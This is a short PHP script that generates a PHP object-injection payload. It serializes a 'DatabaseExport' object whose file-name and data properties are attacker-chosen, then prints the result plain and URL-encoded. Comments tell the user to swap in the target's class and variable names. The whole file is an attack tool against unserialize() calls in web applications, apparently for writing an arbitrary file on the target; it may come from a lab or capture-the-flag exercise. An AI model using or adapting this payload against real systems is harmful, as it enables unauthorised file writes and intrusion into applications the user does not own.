<?php

// RUN: php serialize.php

// Change Class name to target Class name.
class DatabaseExport {

    // Change variable to target variable.
    public $user_file = 'gitmasterson1c.html';
    public $data = '<h1>Testing</h1>';
}

echo "Plain Payload: \n" . serialize(new DatabaseExport) . "\n";
echo "URL Encoded Payload: \n" . urlencode(serialize(new DatabaseExport)) . "\n";

?>